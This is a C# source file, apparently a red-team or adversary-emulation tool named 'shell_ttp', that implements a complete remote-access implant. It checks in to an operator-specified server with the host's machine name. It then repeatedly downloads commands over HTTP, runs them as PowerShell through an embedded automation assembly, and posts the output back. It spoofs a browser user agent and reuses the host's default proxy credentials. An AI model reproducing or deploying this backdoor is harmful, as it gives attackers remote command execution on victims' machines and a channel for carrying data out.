using System;
using System.Net;
using System.Linq;
using System.Collections.Generic;
using System.Management.Automation;
using System.Text.RegularExpressions;
using System.Collections.ObjectModel;
using System.Collections;
using System.Text;
using System.Reflection;

namespace shell_ttp
{
    class Program
    {
        string uri;

        static void Main(string[] args)
        {
            AppDomain.CurrentDomain.AssemblyResolve += CurrentDomain_AssemblyResolve;
            try
            {
                PowerShell PowerShellInstance = PowerShell.Create();

                Dictionary<string, string> parsedArgs = ParseCommandArguments(" " + string.Join(" ", args));
                int sleep = 2;
                string uri = string.Format("http://{0}:{1}/", parsedArgs["SERVER"], parsedArgs["PORT"]);
                string proxyAddress = string.Empty;
                bool useProxy = parsedArgs.ContainsKey("PROXY");
                WebClient client = new WebClient();
                IWebProxy proxy = null;

                parsedArgs["USERAGENT"] = parsedArgs.ContainsKey("USERAGENT") ? parsedArgs["USERAGENT"] : "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)";
                if (useProxy)
                {
                    if (parsedArgs.ContainsKey("PROXYADDRESS"))
                    {
                        proxyAddress = parsedArgs["PROXYADDRESS"];
                        proxy = new WebProxy(parsedArgs["PROXYADDRESS"], false, new string[] { }, CredentialCache.DefaultNetworkCredentials);
                    }
                    else
                    {
                        proxy = WebRequest.GetSystemWebProxy();
                        proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
                    }
                }

                client.Proxy = proxy;

                checkIn(uri, parsedArgs["USERAGENT"], client);
                while (true)
                {
                    client.Headers.Add("User-Agent", parsedArgs["USERAGENT"]);
                    client.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
                    client.Headers.Add("Accept", "text/plain");
                    string results = string.Empty;
                    string command = client.DownloadString(uri).Trim();

                    if (command != string.Empty)
                    {
                        if (command.Length >= "checkin".Length && string.Equals(command.Substring(0, "checkin".Length), "checkin", StringComparison.OrdinalIgnoreCase))
                        {
                            results = "Checking in...";
                        }
                        else if (command.Length >= "sleep".Length && string.Equals(command.Substring(0, "sleep".Length), "sleep", StringComparison.OrdinalIgnoreCase))
                        {
                            sleep = Convert.ToInt32(command.Split(' ')[1]);
                            results = string.Format("Sleep updated to {0}", sleep);
                        }
                        else if (command.Length >= "exit".Length && string.Equals(command.Substring(0, "exit".Length), "exit", StringComparison.OrdinalIgnoreCase))
                        {
                            break;
                        }
                        else
                        {
                            results = ExecuteCommand(command, PowerShellInstance);
                        }

                        sendResults(results, uri, parsedArgs["USERAGENT"], client);
                    }

                    System.Threading.Thread.Sleep(sleep * 1000);
                }

            }
            catch (Exception ex)
            {
                Console.Error.WriteLine("ShellTTP.Main - Unknown - {0}", ex.ToString());
            }
        }

        private static Assembly CurrentDomain_AssemblyResolve(object sender, ResolveEventArgs args)
        {
            using (var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("EmbedAssembly.System.Management.Automation.dll"))
            {
                byte[] assemblyData = new byte[stream.Length];
                stream.Read(assemblyData, 0, assemblyData.Length);
                return Assembly.Load(assemblyData);
            }
        }

        static void checkIn(string uri, string ua, WebClient client)
        {
            sendResults("checkin:" + Environment.MachineName, uri, ua, client);
        }
        
        static void sendResults(string results, string uri, string ua, WebClient client)
        {
            client.Headers.Add("User-Agent", ua);
            client.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
            client.Headers.Add("Accept", "text/plain");
            client.UploadString(uri + "index.aspx", "POST", results);
        }

        static string recurseEnumerable(object obj)
        {
            string result = string.Empty;
            IEnumerable enumerable = obj as IEnumerable;

            if (enumerable != null && !(obj is string))
            {
                foreach (var item in enumerable)
                {
                    result += recurseEnumerable(item);
                }
            }
            else 
            {
                if (obj is DictionaryEntry)
                {
                    DictionaryEntry de = (DictionaryEntry)obj;
                    result += string.Format("{0} - {1}\n", de.Key, de.Value);
                }
                else
                {
                    result = string.Format("{0}\n", obj.ToString());
                }
            }

            return result;
        }
        static string ExecuteCommand(string command, PowerShell PowerShellInstance)
        {
            string result = string.Empty;

            PowerShellInstance.AddScript(command);
            Collection<PSObject> PSOutput = PowerShellInstance.Invoke();

            foreach (var obj in PSOutput)
            {
                result += recurseEnumerable(obj.BaseObject);
            }

            return result;
        }

        /// <summary>
        /// Parses options and values.
        /// </summary>
        /// <param name="args">String of flags/parameters for powerview command.</param>
        /// <returns>Dictionary containing the options and values to be used in
        /// the powerview function.</returns>
        private static Dictionary<string, string> ParseCommandArguments(string args)
        {
            Dictionary<string, string> result = new Dictionary<string, string>();

            foreach (string option in Regex.Split(args, @"\ \-"))
            {
                if (option.Trim().Length > 0)
                {
                    List<string> parameters = option.Trim().Split(' ').ToList<string>();
                    try
                    {
                        result.Add(parameters[0].ToUpper(), string.Join(" ", parameters.GetRange(1, parameters.Count - 1).ToArray()).Trim());
                    }
                    catch
                    {
                        throw new Exception("Program.ParseCommandArguments - Unable to add Argument: " + option + "\nNote: Each argument can only be set once");
                    }
                }
            }
            return result;
        }

    }
}
